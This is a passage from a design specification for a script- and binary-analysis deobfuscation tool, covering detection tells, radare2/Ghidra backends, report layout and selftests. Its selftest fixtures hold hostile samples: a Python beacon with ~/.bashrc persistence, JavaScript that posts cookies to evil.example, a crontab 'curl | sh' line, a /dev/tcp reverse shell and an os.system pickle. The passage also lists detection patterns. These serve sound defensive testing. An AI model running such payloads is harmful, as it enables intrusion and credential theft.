| MD5 / SHA-1 init | table + imm | u32 `0x67452301 0xefcdab89 0x98badcfe 0x10325476` (+ `0xc3d2e1f0` → name "SHA-1 init") | high |
| MD5 T table | table + imm | u32 `0xd76aa478 0xe8c7b756 0x242070db 0xc1bdceee` | high |
| CRC32 table | table | u32 `0x00000000 0x77073096 0xee0e612c 0x990951ba` | high |
| CRC32 poly | imm, distinctive | u32 `0xedb88320` | low |
| TEA/XTEA delta | imm, distinctive | u32 `0x9e3779b9`, `0x61c88647` | medium |
| ChaCha/Salsa | table | ASCII `expand 32-byte k`, `expand 16-byte k` | high |
| Blowfish P-array | table + imm | u32 `0x243f6a88 0x85a308d3 0x13198a2e 0x03707344` | high |
| DES IP table | table | `3a 32 2a 22 1a 12 0a 02` | medium |
| RC4/identity table | table | `bytes(range(256))` | medium ("RC4 KSA init or lookup table") |
| FNV-1 32 | imm | `0x811c9dc5`, `0x01000193` | low |
| Base64 alphabet | table | ASCII `ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/` | medium |
| Custom base64 alphabet | rule | any 64-char run of printable chars that is a permutation of the std alphabet (or with `-_`) and ≠ std/urlsafe | high — CTF tell `T-CUSTOM-B64` |

Script lane: the same table is applied to (1) the UTF-8 bytes of every layer
(catches embedded tables as `\x63\x7c…` after the folder resolved them — scan
folded bytes/str constants too) and (2) integer literals: a list literal whose
first 4 elements equal a `table` u32/byte set, or any int literal equal to an
`imm` value → same result names, loc = line.

Each hit: `{"name","offset","vaddr"?,"section"?,"function"?,"confidence","tag"}`.

### 8.3 Tells and scores

Tell IDs (MUST exist; detail text is implementer's choice but must name the
construct):

`T-DECODE-EXEC` (high: decode chain → sink), `T-DYN-EXEC` (high: sink with
non-literal unfoldable arg), `T-LAMBDA-WRAPPER` (medium), `T-MARSHAL` (high),
`T-PICKLE-REDUCE` (high), `T-JS-PACKED` (medium), `T-JS-STRING-TABLE`
(medium), `T-JS-STRING-TABLE-RC4` (medium), `T-JSFUCK` / `T-AAENCODE` /
`T-JJENCODE` (high), `T-SHELL-PIPE-EXEC` (high), `T-DOWNLOAD-EXEC` (high),
`T-REVSHELL` (high), `T-PERSIST` (high), `T-CRED-ACCESS` (high),
`T-DESTRUCTIVE` (high), `T-MEMORY-EXEC` (high), `T-PRIVESC` (medium),
`T-ANTI-DEBUG` (medium), `T-ANTI-FORENSICS` (medium), `T-HARDCODED-IP`
(medium; any IP not tagged private/loopback/link-local), `T-HARDCODED-SECRET` (medium), `T-RENAME-DENSITY`,
`T-CONCAT-SPLIT`, `T-CHARCODE-ARRAY`, `T-ESCAPE-DENSITY`, `T-GETATTR-STRING`,
`T-IMPORT-DYNAMIC`, `T-LONG-LITERAL`, `T-CUSTOM-B64` (high), `T-CHECKER`
(info), `T-SIZE-CAP` (info), `T-DEPTH-CAP` (info), `T-SLEEP` (low).
Binary-only: `T-PACKED` (high), `T-UPX` (high), `T-PTRACE` (medium),
`T-TIMING` (low), `T-VM-CHECK` (low), `T-PROC-SELF` (medium), `T-SELF-MODIFY`
(medium: `mprotect`/`VirtualProtect` + RWX), `T-EXEC-STACK` (medium: NX
disabled), `T-STATIC-STRIPPED` (info), `T-DOTNET` (info), `T-PYINSTALLER`
(info), `T-XOR-LOOP` (low), `T-EMBEDDED-FILE` (medium).

Every capability rule with severity ≥ medium also emits its tell (rule →
tell mapping in the rule table; e.g. SH-PERSIST → T-PERSIST).

**Risk score** (tell density, 0–100): weight `info 0, low 3, medium 8,
high 20`; each tell id counts at most 3 times; `score = min(100, sum)`;
band `low < 20 ≤ medium < 50 ≤ high`. Labelled in output as
`tell density` — never "maliciousness".

**Obfuscation score** (0–100): `+15` per unwrapped layer (max 60),
`+15` rename density ≥ 0.40 (`+8` ≥ 0.20), `+8` concat split medium, `+5`
each of charcode-array / escape-density / getattr-string / dynamic import,
`+20` JSFuck/aa/jj, `+10` packed binary. Band `none < 10 ≤ light < 40 ≤ heavy`.

---

## 9. Lane 2 — binary lane

### 9.1 Engines (`detect_engines`)

```python
@dataclass
class Engines:
    r2_path: str | None          # which("r2") or which("radare2")
    r2pipe: Any | None           # imported module or None
    ghidra_path: str | None      # see §4 'engines' search order
    capstone: bool               # disasm.capstone is not None
    r2_backend_factory: Callable | None = None   # selftest injection (FakeR2)
    ghidra_runner: Callable | None = None        # selftest injection (canned JSON)
```

`r2pipe` import is attempted lazily inside `detect_engines` (`try: import
r2pipe except Exception: None`). Selection for `--engine`:

| `--engine` | r2 present | ghidra present | runs |
|---|---|---|---|
| `auto` (default) | yes | – | builtin + r2 |
| `auto` | no | – | builtin only, r2 status `skipped` (reason "radare2 not found on PATH"), exit 0; ghidra `not-requested` (ghidra is never auto-run: JVM start-up is slow; NEXT STEPS suggests `--engine ghidra` when present) |
| `r2` | no | – | builtin only, `engines.r2.status="skipped"`, reason "radare2 not found on PATH", exit 1 |
| `ghidra` | – | no | builtin only, `skipped`, exit 1 |
| `none` | – | – | builtin only, r2/ghidra `not-requested` |

**The builtin analysis always runs** and is the baseline; engines *augment* it
(§9.5). Engine failure (`error`) never removes builtin content.

### 9.2 Builtin analysis (stdlib + optional capstone) — MUST be genuinely useful

Output keys under `report.binary` (§9.5 lists all). Steps:

#### 9.2.1 Headers & protections

ELF: `triage.parse_elf` → class, endian, machine (`triage.ELF_MACHINES`), type,
entry, interp; `triage.elf_protections`; `disasm.parse_elf` (section/segment
map used by everything below; on `disasm.ElfError` the lane continues with
headers + strings + crypto scan only, note "section map unavailable").
Static/stripped flags: no `PT_INTERP` & no `.dynamic` → static; no `.symtab` →
stripped (`T-STATIC-STRIPPED` info). NX disabled → `T-EXEC-STACK`.

PE: `triage.parse_pe` + §9.6.

#### 9.2.2 Sections, entropy, packers

Per section: name, offset, size, entropy (`triage.entropy`, note via
`triage.entropy_note`). Packer tells: section names `UPX0/UPX1/UPX2` or
`UPX!` magic within first 4 KiB or `$Info: This file is packed with the UPX`
→ `T-UPX` (suggest `upx -d` in NEXT STEPS only if `which("upx")`); `.text`
entropy ≥ 7.2 or overall ≥ 7.4 with < 5 imports → `T-PACKED`.
High-entropy windows: 256-byte sliding window (step 128) entropy ≥ 7.5 inside
`.data`/`.rodata`/`.rdata` → "possible encrypted blob at off/vaddr (N bytes)"
(merge adjacent windows), confidence low.
PyInstaller: `MEI\x0c\x0b\x0a\x0b\x0e` cookie or strings `_MEIPASS`/`pyi-` →
`T-PYINSTALLER` (+ NEXT STEPS "extract with pyinstxtractor (not bundled), then
run revauto on the .pyc"). Go (`.gopclntab`, `Go build ID:`) and Rust
(`rust_panic`, `/rustc/`) → info notes (function names may be in symbols).

#### 9.2.3 Symbols, imports, exports (`elf_symbols`)

`elf_symbols(data) -> list[dict]` — own struct parser over section headers
(name, type, link, entsize from the raw headers): read `.symtab` and `.dynsym`
entries `{name, value, size, type (FUNC/OBJECT/…), bind, shndx, table}`;
bounded to 200 000 entries. Imports = `.dynsym` entries with `shndx == 0`
(UND) and a name; exports = defined `GLOBAL`/`WEAK` `.dynsym` FUNC/OBJECT.
Version suffixes (`@GLIBC_2.2.5`) stripped for display.

Each import is mapped through `API_MAP` (dict name → (category, tell or None,
phrase)). MUST rows:

| names | category | tell |
|---|---|---|
| `socket connect bind listen accept send sendto recv recvfrom getaddrinfo gethostbyname inet_addr inet_pton` | NETWORK | – |
| `curl_easy_* SSL_connect` | NETWORK | – |
| `fopen open openat read fread fgets` / `fwrite write fputs fprintf rename` / `unlink remove` | FILE_READ / FILE_WRITE / FILE_DELETE | – |
| `system popen execve execl execlp execv execvp fork vfork posix_spawn` | EXEC | – |
| `ptrace` | ANTI_ANALYSIS | T-PTRACE |
| `prctl` (string `PR_SET_DUMPABLE` not needed), `getppid` | ANTI_ANALYSIS | – |
| `strcmp strncmp memcmp strcasecmp strstr bcmp` | COMPARE_CHECK | – |
| `srand rand random time clock_gettime gettimeofday` | RNG (time-based: also `T-TIMING` low when ptrace or rdtsc also present) | – |
| `mprotect mmap` | MEMORY_EXEC | T-SELF-MODIFY when `mprotect` present |
| `dlopen dlsym` | DYNAMIC_LOAD | – |
| `EVP_* AES_* MD5* SHA1* SHA256* RC4* DES_* BF_* crypt` | CRYPTO | – |
| `scanf fgets gets read getline __isoc99_scanf` | INPUT | – |
| `printf puts write fputs` | OUTPUT | – |
| `getuid geteuid setuid setgid` | PRIVESC | – |
| `signal sigaction raise alarm` | ANTI_ANALYSIS (low; `SIGTRAP` handler is a classic anti-debug) | – |
| WinAPI: `IsDebuggerPresent CheckRemoteDebuggerPresent NtQueryInformationProcess OutputDebugString* GetTickCount QueryPerformanceCounter` | ANTI_ANALYSIS | T-ANTI-DEBUG |
| WinAPI: `VirtualAlloc* VirtualProtect* WriteProcessMemory CreateRemoteThread NtUnmapViewOfSection` | MEMORY_EXEC | T-MEMORY-EXEC |
| WinAPI: `InternetOpen* InternetReadFile HttpSendRequest* URLDownloadToFile* WinHttp* WSAStartup` | NETWORK | – |
| WinAPI: `RegSetValueEx* RegCreateKey*` | PERSISTENCE | T-PERSIST |
| WinAPI: `CryptEncrypt CryptDecrypt CryptAcquireContext* BCrypt*` | CRYPTO | – |
| WinAPI: `CreateProcess* ShellExecute* WinExec` | EXEC | – |

#### 9.2.4 Code scan: calls, PLT resolution, functions, main

All of this works **without capstone** (byte patterns), for x86 / x86-64 only;
other machines → note "code scan: n/a for <arch>" and skip to §9.2.6.

1. **PLT map**: for every executable section whose name starts with `.plt`
   (`.plt`, `.plt.sec`, `.plt.got`): scan for `ff 25 <disp32>` (and the
   `f2 ff 25` bnd form; `f3 0f 1e fa` endbr64 may precede). x64: GOT addr =
   address after the jmp + disp; x86 non-PIE: disp is absolute. Map GOT addr →
   symbol with `pwnhelp.got_plt(data)`; stub start (16-byte aligned stub
   containing the jmp) → import name. Gives `plt: {stub_vaddr: name}`.
2. **Calls** (`_scan_calls`): every `e8 rel32` in executable sections whose
   target lands inside an executable section (any, incl. `.plt*`) →
   `(site, target)`; `ff 15 disp32` (x64 `call [rip+disp]`) → GOT addr →
   import (for `-fno-plt` binaries). Capped at 500 000 sites.
3. **Function starts**: union of `.symtab`/`.dynsym` FUNC symbols (with
   `st_size`), entry point, `main` (below), call targets inside `.text`,
   `f3 0f 1e fa` (endbr64) at 16-byte-aligned offsets in `.text`, and
   `55 48 89 e5` prologues (x64) / `55 89 e5` (x86). Without a symbol size, a
   function extends to the next start (confidence low, name `sub_<hex>`).
   Symbol-derived functions are confidence high.
4. **main recovery** (stripped, glibc): in the first 64 bytes at entry, find
   `48 c7 c7 imm32` (mov rdi, imm32) or `48 8d 3d disp32` (lea rdi,[rip+d])
   before a call to `__libc_start_main` (PLT or `ff 15` GOT) → `main`. x86:
   the last `68 imm32` (push imm32) before the call. Named `main` with
   confidence medium (high when from symbols).
5. **String references per site**: `disasm.find_xrefs(data, elf)["strings"]`
   (x64 LEA rip-rel) plus, for x86/non-PIE, `68 imm32` / `b8+r imm32` /
   `c7 04 24 imm32` immediates pointing at a printable NUL-terminated string in a
   non-exec section.

#### 9.2.5 Anti-debug, syscalls, timing, XOR loops

- **Syscall sites**: `0f 05` (x64) and `cd 80` (x86) in executable sections.
  Look back ≤ 16 bytes for the nearest `b8 imm32` (mov eax), `48 c7 c0 imm32`,
  `b0 imm8`, `66 b8 imm16`, `6a imm8 58` (push/pop rax), `31 c0`/`48 31 c0` →
  0 (only if no later mov). Number → name via `disasm.SYSCALLS` (x64) or the
  module's `SYSCALLS_I386` table (MUST include: 1 exit, 3 read, 4 write,
  5 open, 6 close, 11 execve, 26 ptrace, 37 kill, 102 socketcall, 120 clone,
  125 mprotect, 192 mmap2, 252 exit_group, 359 socket, 362 connect). Unknown
  number → `?`. `ptrace` syscall → `T-PTRACE`; `execve` → EXEC;
  `socket`/`connect` → NETWORK; `mprotect` → `T-SELF-MODIFY`.
- **int3**: isolated `cc` bytes in `.text` not part of a run of ≥ 2 `cc` and
  not immediately after `c3`/`e9 rel32`/`eb rel8` (padding) → count; ≥ 1 →
  `T-ANTI-DEBUG` low ("int3 traps"). Note: heuristic, may hit immediates
  (confidence low; with capstone, verify the `cc` decodes as an instruction
  start in a linear sweep of its function → medium).
- **rdtsc** `0f 31` → `T-TIMING`; **cpuid** `0f a2` → `T-VM-CHECK`.
- **Strings**: `/proc/self/status`, `TracerPid`, `/proc/self/maps`,
  `LD_PRELOAD`, `gdb`, `frida`, `ptrace`, `vmware`, `VBox`, `QEMU` →
  `T-PROC-SELF` / `T-ANTI-DEBUG` / `T-VM-CHECK`.
- **XOR loops** (low): `34 KK` (xor al, imm8), `80 f0+r KK` (xor r8, imm8),
  `80 34 xx KK` / `80 74 xx yy KK` (xor byte [mem], imm8), `83 f0+r KK` within
  32 bytes before a backward short/near jump (`eb/7x rel8 < 0` or
  `e9/0f 8x rel32 < 0`) → `xor_sites` with key histogram; report the top keys
  (count ≥ 2 or in a function that also references a flag-ish string) as
  `T-XOR-LOOP` with "possible single-byte XOR key 0xKK".

#### 9.2.6 Strings

`triage.extract_strings(data, 5)` for values; offsets recovered by a
`re.finditer` with the same patterns (ASCII and UTF-16LE), capped
`MAX_FINDINGS`. Each string: `value, offset, vaddr (disasm.offset_to_vaddr),
section, xrefs [{site, function}] (from §9.2.4.5 / r2 / ghidra), tags`.
Tags: `FLAG` (flag regexes), `PROMPT` (`(?i)enter|input|password|passwd|key|flag|serial|licen[cs]e|correct|wrong|incorrect|success|fail|nope|try again|congrat|access (granted|denied)|usage`),
`FORMAT` (`%[-+ #0]*\d*(?:\.\d+)?[sdxXpculi]`), `PATH`, `URL`, `IP` (§8.1
regexes), `B64` (≥ 16 chars, decodes to ≥ 0.9 printable — decoded preview
attached), `HEX` (even-length hex ≥ 16 → decoded preview if printable),
`ANTI` (§9.2.5 list), `CRYPTO` (`(?i)\b(aes|rc4|xor|key|iv|salt|sha\d*|md5|des|chacha|tea)\b`),
`LIBC` (names matching an import). Ranking for compact output:
FLAG > PROMPT > URL/IP/PATH > B64/HEX > ANTI/CRYPTO > FORMAT > rest; within a
tag, strings with xrefs first. IOC extraction runs over all strings
(tag `from-binary`).

#### 9.2.7 Crypto constants & embedded files

`scan_crypto_constants(data)` (§8.2), each hit mapped to section + vaddr +
containing function. `binextras.scan_signatures(data)` hits at offset > 0
(excluding the `PE/MZ`/`BMP` 2-byte magics, which are too noisy, unless the
PE header validates) → `embedded` list + `T-EMBEDDED-FILE`.

#### 9.2.8 Per-function digest (the binary analogue of "what each part does")

For each function (from §9.2.4.3, or the engine's list after merge), collect
inside `[start, end)`: string refs, import calls (via PLT map / `ff 15`),
internal calls (targets that are function starts), syscall sites, crypto hits,
xor sites, int3/rdtsc/cpuid sites, count of backward jumps (loops).
Build a `Block(kind="binary-function")` with actions, e.g.:

- `refs "Enter the flag:"` (PROMPT/FLAG/URL strings first, max 3),
- `calls strcmp (COMPARE_CHECK)`, `calls ptrace (anti-debug)`,
- `syscall ptrace (101)`, `rdtsc timing check`,
- `uses AES S-box @0x4020a0`,
- `loop with xor imm 0x37 (possible XOR decode)`,
- `calls sub_401196, check_flag`.

Function ranking (compact shows top 12, `--deep` all): `main` first, then by
`interest = 5·FLAG/PROMPT refs + 4·anti-debug + 4·crypto + 3·COMPARE_CHECK
calls + 2·NETWORK/EXEC calls + 1·other import calls`, ties by address.
Functions with interest 0 and no symbol are omitted from compact output
(counted in "… N more").

#### 9.2.9 Disassembly (`--deep`, and compact for `main` only)

Compact: first 16 instructions of `main` (or entry if no main) via
`disasm.disassemble` (capstone) or `disasm.hexdump` of 64 bytes with
`disasm.NO_CAPSTONE_MSG`. `--deep`: up to 8 top-ranked functions, 64
instructions each, annotated: when capstone is present, lines whose operand
resolves to a string/PLT/import get a `; "string"` / `; strcmp` comment.

### 9.3 radare2 backend

Two interchangeable backends behind `R2Session` protocol: `cmdj(cmd) -> Any |
None`, `cmd(cmd) -> str`, `close()`.

1. **r2pipe** (when importable): `r2pipe.open(path, flags=["-2", "-N", "-e",
   "scr.color=0", "-e", "bin.cache=true"])`. r2pipe has no timeout: run the
   whole batch (below) in a daemon `threading.Thread`, `join(timeout)`; on
   timeout call `r2.quit()` (and `r2.process.kill()` if the attribute exists),
   status `error`, reason `timeout after Ns`.
2. **subprocess** (no r2pipe): batch script, **one** process per phase:

   ```
   [r2, "-2", "-q", "-N", "-e", "scr.color=0", "-e", "scr.interactive=false",
    "-e", "bin.cache=true", "-e", "search.maxhits=500", "-c", SCRIPT, path]
   ```

   `SCRIPT` = commands joined by `;`, each preceded by `?e @@RA@@<key>` so the
   output can be split: lines starting with `@@RA@@` start a new chunk; each
   chunk is `json.loads`-ed (empty → `None`, invalid → `None` + note). Run with
   `subprocess.Popen(..., stdout=PIPE, stderr=PIPE, stdin=DEVNULL)`,
   `communicate(timeout=…)`; on timeout `kill()` then `communicate()` and parse
   whatever partial output exists (status `error`, partial results kept).

Phase 1 commands (key → command): `info → ij`, `sections → iSj`,
`imports → iij`, `exports → iEj`, `symbols → isj`, `strings → izj`,
`analysis → aaa` (`aa` when file > 8 MiB and not `--deep`), `functions → aflj`,
`syscalls → /asj`, `main → afij @ main` (ignore failure).
Phase 2 (needs phase-1 addresses; xrefs): for up to 40 top-ranked strings
(§9.2.6 ranking) and up to 40 interesting imports (API_MAP categories other
than OUTPUT): `axtj @ <vaddr>` / `axtj @ sym.imp.<name>`. With `--deep`:
`pdf @ main` (text, ≤ 300 lines) and `pdc @ main` is **not** used (r2's pseudo
is unreliable); `pdsf @ <fcn>` summaries (text, ≤ 60 lines each) for top 5.

Lenient field access (r2 JSON changed across versions): helper
`_jaddr(d) = d.get("addr", d.get("offset", d.get("vaddr", d.get("from"))))`;
names from `name` / `realname` / `flagname`; `izj` `string` values that fail
printable but `b64decode` to printable are decoded (older r2 base64-encoded
strings). Every parse is wrapped; a bad chunk drops that key only.

Digest produced (merged per §9.5): functions `{name, addr, size, nbbs?,
calls?}`, imports `{name, plt, lib}`, exports, strings `{vaddr, paddr,
string, section}`, xrefs `{target, from, fcn_name, type}`, syscalls `{addr,
name/sysnum}`. Crypto constants and anti-debug byte checks come from the
builtin scan (r2 adds function attribution via its function ranges).

r2 version in `engines` / report: first line of `r2 -v` (timeout 5 s).

### 9.4 Ghidra backend (SHOULD; real run is best-effort)

- Locate `analyzeHeadless` (§4). Write the Java post-script from **Appendix A**
  (string constant `_GHIDRA_SCRIPT`) into a `tempfile.TemporaryDirectory()`
  together with an empty project dir.
- Command:

  ```
  [ah, <tmp>/proj, "revauto", "-import", path, "-scriptPath", <tmp>,
   "-postScript", "RevautoDigest.java", <tmp>/out.json, str(N_DECOMP),
   "-deleteProject", "-analysisTimeoutPerFile", str(timeout)]
  ```

  `N_DECOMP` = 3 (compact) / 10 (`--deep`). Subprocess timeout = `timeout +
  120`. stdin `DEVNULL`, stdout/stderr captured (last 20 stderr lines go into
  `reason` on failure).
- Parse `out.json` (schema in Appendix A). Missing/invalid → status `error`.
- Merge per §9.5; decompiled C for the top functions is shown under
  `DECOMPILED` (compact: `main` only, ≤ 60 lines; `--deep`: all returned,
  ≤ 200 lines each).
- `--deep` + `--dump-layers DIR` also writes `RevautoDigest.java` into DIR
  (lets the user rerun it in the Ghidra GUI).

The script generation and JSON parsing are tested in selftest with a canned
JSON (S11); an actual Ghidra run is not part of CI.

### 9.5 Merge and `report.binary` layout

```python
report.binary = {
  "format": "ELF64|ELF32|PE32|PE32+", "arch": "...", "bits": 64, "endian": "little",
  "type": "EXEC|DYN|...", "entry": int, "interp": str|None, "static": bool, "stripped": bool,
  "protections": {...triage...},
  "sections": [{"name","offset","size","entropy","note","exec"}],
  "packer": {"upx": bool, "packed": bool, "pyinstaller": bool, "notes": [...]},
  "imports": [{"name","category","lib","plt"}], "exports": [{"name","addr"}],
  "functions": [{"name","addr","size","source": "symtab|heuristic|r2|ghidra",
                 "confidence","interest","calls": [...], "imports_called": [...],
                 "strings": [...], "crypto": [...], "syscalls": [...], "tags": [...]}],
  "main": int|None,
  "strings": [{"value","offset","vaddr","section","tags","xrefs": [{"site","function"}]}],
  "crypto": [...§8.2 hits...],
  "antidebug": [{"kind","site","function","detail","confidence"}],
  "syscalls": [{"site","number","name","function"}],
  "xor_sites": [{"site","key","function"}], "xor_keys": [[key, count], ...],
  "high_entropy": [{"offset","vaddr","size","entropy"}],
  "embedded": [{"offset","name"}],
  "disasm": {"main": str, "functions": {name: str}},
  "decompiled": {name: str},
}
```

Merge rules: functions are keyed by address; engine entries override builtin
`name`/`size` (and `source` becomes the engine), builtin per-function facts
are recomputed over the engine's ranges. Strings keyed by vaddr (or offset);
xrefs union. Imports keyed by name; engine adds `lib`/`plt`. Conflicts are
never errors.

### 9.6 PE minimal (MUST: headers, sections, imports, strings, crypto, anti-debug imports)

- Headers/sections from `triage.parse_pe`; entropy per section; UPX section
  names.
- **Imports**: own parser — data directory 1 (import table) RVA → file offset
  via sections (`va ≤ rva < va + max(vsize, size)`); walk 20-byte
  `IMAGE_IMPORT_DESCRIPTOR`s until all-zero (≤ 256 DLLs); thunk array
  (`OriginalFirstThunk` or `FirstThunk`), 8-byte (PE32+) / 4-byte entries,
  high bit → ordinal `#N`, else hint/name (≤ 4 096 imports). Mapped through
  `API_MAP`.
- `.NET`: data directory 14 non-zero → `T-DOTNET` + NEXT STEPS "managed
  assembly: use ILSpy/dnSpy (not bundled)"; skip code scan.
- Strings, IOCs, crypto scan, embedded scan as for ELF.
- Code scan: x86/x64 only, on the section containing the entry RVA: syscall
  scan is skipped (Windows), int3/rdtsc/cpuid + XOR loops run; disasm of
  entry (16 insns) via capstone if present.
- No function list without an engine (note "function list requires r2/ghidra
  for PE"); r2 backend works for PE unchanged.

---

## 10. Report rendering

### 10.1 Compact text (default)

Section order (empty sections print their header and `(none)` only for the
MUST-present sections listed in §11 S8/S2; other empty sections are omitted):

Script lane: `SUMMARY`, `LAYERS`, `PARTS`, `CHECKERS` (if any), `TELLS`,
`IOCS`, `CRYPTO` (if any), `NEXT STEPS`, `NOTES`/`ERRORS` (if any).

Binary lane: `SUMMARY`, `HEADERS`, `PROTECTIONS`, `ENGINE`, `IMPORTS`,
`FUNCTIONS`, `STRINGS`, `CRYPTO`, `ANTI-DEBUG`, `SYSCALLS`, `EMBEDDED`,
`DISASM` (main only), `DECOMPILED` (ghidra only), `TELLS`, `IOCS`,
`NEXT STEPS`, `NOTES`/`ERRORS`.

Format: section header `== NAME ==`; list rows `  [H] …`/`[M]`/`[L]`; limits
per section in compact mode: LAYERS all (≤ 24), PARTS 20, TELLS 20 (sorted
severity desc, then loc), IOCS 25 (sorted type priority flag > url > ip_port >
ip > domain > path > rest), STRINGS 20, FUNCTIONS 12, IMPORTS grouped by
category on one line each, CRYPTO 10, ANTI-DEBUG 10, SYSCALLS grouped
`name x count`. Overflow line: `  … N more (--deep)`.

`SUMMARY` lines: headline; `flow:` line (script lane); `behaviours:`
categories; `risk: 72/100 (high, tell density)`; `obfuscation: 60/100
(heavy, 3 layers)`; `flags:` (if any, always shown in full — never truncated);
engines line in the binary lane (`engine: builtin (r2 absent, capstone
absent)`).

Headline template: `<name>: <lang/format desc>, <N> obfuscation layer(s)
unwrapped, <K> parts, risk <band>` (script); `<name>: <ELF64 x86-64 DYN, PIE,
stripped>, <F> functions, <I> imports, engine <engine>` (binary).

`NEXT STEPS` (≤ 6 bullets, only suggestions that apply): e.g. `recon.py
decode -f <dumped layer>`, `recon.py hashid crack <hex>` (hash checker),
`recon.py gdbkit find ptrace` (anti-debug present), `recon.py elfpatch nop …`
(ptrace check site address given), `--engine ghidra` (if present and not
used), `upx -d` (if present and UPX), `--dump-layers DIR` (if layers > 1 and
not dumped), `pycdc` (version-mismatched pyc).

### 10.2 `--deep`

Everything un-truncated (still subject to `MAX_FINDINGS`), plus: per-layer
preview (40 lines) for every layer, Python cleaned view of each leaf,
pyc `dis` text, pickle opcode listing, all strings, all functions with
disassembly (§9.2.9), all r2/ghidra extras.

### 10.3 Appendix B shows target outputs; implementation MUST match the
section names, ordering, confidence-label format and headline templates; exact
spacing is free.

---

## 11. Selftest specification

`selftest()` prints `  [PASS] <name>` / `  [FAIL] <name>` per check (like
`disasm`), a closing `selftest: OK|FAILED`, and returns `bool`. All fixtures
are built in memory; temp files only via `tempfile`. Engine detection is
**always injected** in selftest so results do not depend on the host
(except S10b). Total runtime budget: **< 6 s** without r2 on the CI runner.
Output of `run()` calls is captured with `contextlib.redirect_stdout/stderr`.

**S1 — safety lint (MUST).** Parse `revauto.py`'s own source (`open(__file__)`)
with `ast`; assert there is no `Call` whose func is `Name` in
`{eval, exec, compile}` or an `Attribute` chain ending in
`pickle.loads/load`, `marshal.loads/load`, `os.system`, `os.popen`; no
`subprocess.*` call with keyword `shell=True`; no `Import`/`ImportFrom` of
`socket, urllib.request, http.client, requests, ftplib, smtplib, telnetlib`.
(`_MARSHAL_HELPER` is a string constant, so its `marshal.loads` is not an AST
call.) The selftest's own fixture builders must therefore build code objects
without `compile` (see S7).

**S2 — layered Python sample (MUST).** Build (all strings in selftest code):

```python
final = (
    "import socket, os, base64\n"
    "import builtins; builtins.REVAUTO_CANARY = True\n"           # canary (S3)
    "C2 = 'http://10.13.37.5:8080/beacon'\n"
    "KEY = [36, 46, 35, 37, 57, 48, 114, 54, 29, 52, 54, 112, 29, 54, 42, 114, 29, 54, 49, 114, 48, 63]\n"  # flag ^ 0x42, see below
    "def beacon(data):\n"
    "    s = socket.socket()\n"
    "    s.connect(('10.13.37.5', 4444))\n"
    "    s.send(base64.b64encode(data))\n"
    "def persist():\n"
    "    with open(os.path.expanduser('~/.bashrc'), 'a') as f:\n"
    "        f.write('python3 /tmp/.x.py &\\n')\n"
    "def check(flag):\n"
    "    return [ord(c) ^ 0x42 for c in flag] == KEY\n"
    "if __name__ == '__main__':\n"
    "    if check(input('flag? ')):\n"
    "        beacon(b'ok'); persist()\n"
)
```

`KEY` MUST be computed in the fixture builder as `[ord(c) ^ 0x42 for c in
"flag{p4t_v4l_th3_tr0l}"]`-style from a constant `FLAG = "flag{...}"` (the
literal list above is illustrative; generate it, don't hand-type it).
Layering:

- `L3 = final`
- `L2 = "import zlib, base64\nexec(zlib.decompress(base64.b64decode(%r)))\n" % b64(zlib(L3))`
- `L1 = "_ = lambda __ : __import__('zl'+'ib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(%r))" % b64(zlib(L2))[::-1]`
- `L0 = "exec(bytes.fromhex(%r).decode())" % L1.encode().hex()`

Assertions:

1. `len(layers) == 4`, depths 0..3, chain of `via` = `exec` for L1..L3.
2. `layers[1].kind == "hex -> utf8"` (or contains `hex`), `layers[2].kind`
   contains `reverse`, `b64`, `zlib` in that order, `layers[3].kind` contains
   `b64 -> zlib`.
3. `layers[3].text == final` (byte-exact).
4. Blocks on L3: a `function` named `beacon` with `NETWORK` in categories and
   an action containing `10.13.37.5`; `persist` with `PERSISTENCE` and
   `FILE_WRITE` (action mentions `~/.bashrc`); `check` with `COMPARE_CHECK`
   or a Checker at its line; a `main-guard` block whose `calls` include
   `check`, `beacon`, `persist`; an `imports` block.
5. IOCs include url `http://10.13.37.5:8080/beacon`, `ip_port`
   `10.13.37.5:4444`, path `~/.bashrc`, path `/tmp/.x.py`.
6. Checker candidate == `FLAG`, method mentions `xor 0x42`, and `FLAG` is in
   `summary.flags`.
7. Tells include `T-DECODE-EXEC` at loc starting `L0:1` (severity high),
   `T-LAMBDA-WRAPPER` on L1, `T-PERSIST`; `scores.obfuscation.band == "heavy"`.
8. `render_text(report)` contains `== PARTS ==`, `beacon`, and the flag.

**S3 — never executed (MUST).** After S2, `not hasattr(builtins,
"REVAUTO_CANARY")`. Also no file `/tmp/.x.py` was created by the run
(check `os.path.exists` before/after is unchanged).

**S4 — JS eval-packed sample (MUST).** Implement a tiny reference packer in
the selftest (`_js_pack(src) -> str`) producing the standard
`eval(function(p,a,c,k,e,d){…}('<p>',62,<c>,'<k>'.split('|'),0,{}))` form
(words ranked by frequency; index encoded with the packer base-62 scheme;
escape `\` and `'` in `p`). Inner source:

```js
var u="http://evil.example/c2";
function steal(){var d=document.cookie;fetch(u,{method:"POST",body:btoa(d)});}
eval(atob("<b64 of: console.log('stage3');var k='CyberSci{js_p4ck3d}';>"));
steal();
```

Assertions: L1 (unpacked) text equals the inner source exactly (MUST — proves
the unpacker); L1 `via == "eval-packer"`; a further layer L2 exists from the
`eval(atob(...))` with `kind` containing `b64`; block `function steal` has
`NETWORK` + `CREDENTIALS`; IOC url `http://evil.example/c2`; flag
`CyberSci{js_p4ck3d}` found (via `--flag-format`-style `Options.flag_re`
**and** the default `FLAG_RE`); tells include `T-JS-PACKED` and
`T-DECODE-EXEC`.

**S5 — shell sample (MUST).**
`a=ba;b=se64; echo <b64(inner)> | $a$b -d | bash` where inner is
`(crontab -l; echo "* * * * * curl -s http://203.0.113.9/x | sh") | crontab -\nbash -i >& /dev/tcp/203.0.113.9/9001 0>&1\n`.
Assert: one child layer (lang `sh`), tells `T-SHELL-PIPE-EXEC`, `T-PERSIST`,
`T-DOWNLOAD-EXEC`, `T-REVSHELL`, `T-HARDCODED-IP`; IOC `ip_port`/`ip`
`203.0.113.9` tagged `doc` (not `private`) and url `http://203.0.113.9/x`.

**S6 — pickle (MUST).** Protocol-0 bytes
`b"cos\nsystem\n(S'id'\ntR."` as a whole-file input. Assert lane `script`,
a pickle layer, tell `T-PICKLE-REDUCE` whose detail contains `os.system` and
`id`, child sh layer with text `id`. Assert `pickle` was never loaded
(S1 lint covers this).

**S7 — marshal (MUST).** `code = (lambda: "revauto_marshal_marker").__code__`;
`blob = marshal.dumps(code)` (no `compile` needed);
script `import marshal,base64\nexec(marshal.loads(base64.b64decode(%r)))`.
